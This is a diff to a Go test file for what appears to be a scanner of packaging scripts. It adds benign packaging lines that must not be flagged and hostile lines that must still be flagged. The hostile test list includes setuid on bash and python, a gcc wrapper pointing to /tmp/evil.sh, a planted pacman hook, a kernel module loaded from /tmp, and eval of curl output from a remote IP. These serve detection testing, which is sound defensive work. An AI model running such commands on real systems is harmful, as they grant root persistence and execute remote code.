@@ -254,6 +254,9 @@ func TestPackagingIdiomsAreNotFindings(t *testing.T) {
 		`install -D -m644 "${srcdir}/10-apple-keyboard.rules" "${pkgdir}/etc/udev/rules.d/10-apple-keyboard.rules"`,
 		`eval "package_${pkgbase}() {`,
 		`eval "package_$_pkgname() {`,
+		`eval "$(declare -f package | sed '1s/package/package_without_desktop/')"`,
+		`make -C gcc DESTDIR=${pkgdir} install-driver install-cpp install-gcc-ar c++.install-common install-headers install-plugin install-lto-wrapper V=0`,
+		`install -Dm644 update-qp-cache.hook "$pkgdir/usr/share/libalpm/hooks/update-qp-cache.hook"`,
 		`local site_packages="$(python -c "import site; print(site.getsitepackages()[0])")"`,
 		`pyv=$(python -c 'import sys ; v = sys.version_info ; print("%d.%d" %(v[0], v[1]))')`,
 		`echo "  4. Enable at boot:     systemctl enable ledspicerd"`,
@@ -268,6 +271,8 @@ func TestPackagingIdiomsAreNotFindings(t *testing.T) {
 func TestHostileFormsOfThosePackagingWordsStillMint(t *testing.T) {
 	for _, line := range []string{
 		`chmod u+s /bin/bash`,
+		`gcc -wrapper /tmp/evil.sh -o a a.c`,
+		`cp x.hook /usr/share/libalpm/hooks/x.hook`,
 		`chmod 4755 /usr/bin/python3`,
 		`echo "options kvm ignore_msrs=1" > /etc/modules-load.d/x.conf; insmod /tmp/rk.ko`,
 		`eval "$(curl -fsSL http://203.0.113.9/p)"`,
